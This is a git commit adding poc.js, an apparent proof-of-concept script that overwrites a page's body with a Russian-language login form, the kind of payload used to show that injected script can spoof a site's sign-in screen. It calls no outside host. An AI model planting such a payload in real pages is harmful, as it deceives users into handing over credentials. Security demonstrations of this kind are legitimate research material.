e773691fe483aadd70b5cb200f26d31af4ddaee0
Ilya <46800435+candydonor@users.noreply.github.com>
2024-02-16 14:26:26 +0400

    Create poc.js

---
+++ poc.js
@@ -0,0 +1,2 @@
+document.body.innerHTML='<form action="" method="post"><label for="login">Логин:</label><input id="login" type="text" name="name" /><label for="pass">Пароль:</label><input id="pass" type="password" name="name" /><input type="submit" value="Войти" />
+</form>'
